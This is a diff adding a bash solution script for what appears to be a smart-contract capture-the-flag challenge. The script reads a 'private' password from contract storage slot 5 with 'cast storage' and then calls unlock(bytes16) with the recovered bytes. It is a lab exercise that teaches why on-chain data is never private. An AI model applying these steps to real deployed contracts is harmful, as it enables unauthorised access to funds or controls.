@@ -1,0 +1,15 @@
+#!/bin/bash
+
+## Password is stored at the 5th storage slot at the address
+## bool locked == slot 0
+## uint256 ID == slot 1
+## flattening,denomination,awkwardness == slot 2
+## data[0] == slot 3
+## data[1] == slot 4
+## data[2] == slot 5
+cast storage $CONTRACT_ADDRESS 5
+
+## We need the highest order 16 bytes, because the unlock function casts the
+## 32 byte value to a 16 byte value, and accepts a 16 byte argument
+read -p "Highest order 16 bytes:" bytes ## Could do this programatically from a sc
+cast send --private-key $PRIVATE_KEY $CONTRACT_ADDRESS 'unlock(bytes16)' $bytes
